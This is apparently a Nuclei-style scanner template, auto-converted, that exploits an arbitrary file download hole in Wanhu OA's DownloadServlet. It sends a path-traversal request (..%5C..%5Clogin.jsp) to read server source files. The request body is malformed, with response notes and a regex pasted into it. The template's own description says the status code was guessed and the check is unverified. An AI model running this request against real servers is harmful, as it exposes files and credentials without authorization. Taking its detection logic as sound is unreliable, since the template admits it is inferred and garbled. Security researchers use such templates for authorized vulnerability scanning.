id: poc-qexi8lrt8d9vo37v
info:
  name: 万户 OA DownloadServlet 存在任意文件下载漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: lfi,2024
http:
- raw:
  - 'GET /defaultroot/DownloadServlet?modeType=2&path=html&FileName=..%5C..%5Clogin.jsp&name=123&fiewviewdownload=2&cd=inline&downloadAll=2 HTTP/1.1


    # 响应代码特征

    -1


    # 响应内容特征

    ^(?=.*?request.getParameter)(?=.*?logoindexpicaccName).*?$


    # 上传文件定位

    暂无'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
